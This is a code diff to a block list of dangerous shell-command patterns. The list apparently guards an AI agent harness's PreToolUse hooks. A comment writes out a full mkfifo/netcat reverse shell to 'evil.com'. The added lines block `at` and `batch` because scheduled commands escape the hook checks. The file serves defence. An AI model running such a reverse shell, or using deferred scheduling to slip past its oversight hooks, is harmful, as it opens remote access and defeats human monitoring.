@@ -374,6 +374,12 @@ export const DANGEROUS_PATTERNS: DangerousPattern[] = [
   // Reverse shell via mkfifo — `mkfifo /tmp/f; nc evil.com 4444 < /tmp/f | bash > /tmp/f 2>&1`
   // creates a named pipe to tunnel a shell session over netcat. mkfifo has no legitimate use in Bloom.
   { pattern: /\bmkfifo\b/, category: "reverse-shell" },
+  // Persistence via command scheduling — `at` and `batch` schedule commands to execute outside the
+  // current agent session, completely bypassing PreToolUse hooks for the deferred invocation.
+  // `/\bat\s+\S/` requires at least one argument after `at` to avoid matching `cat`.
+  // `batch` is blocked unconditionally; neither command has legitimate use in Bloom.
+  { pattern: /\bat\s+\S/, category: "persistence" },
+  { pattern: /\bbatch\b/, category: "persistence" },
   // Data-exfiltration server — these commands start an HTTP server that serves Bloom's source tree
   // to any external host. None have legitimate use in Bloom's build/test pipeline.
   // `python3 -m http.server` and `python -m http.server` — Python's built-in HTTP server
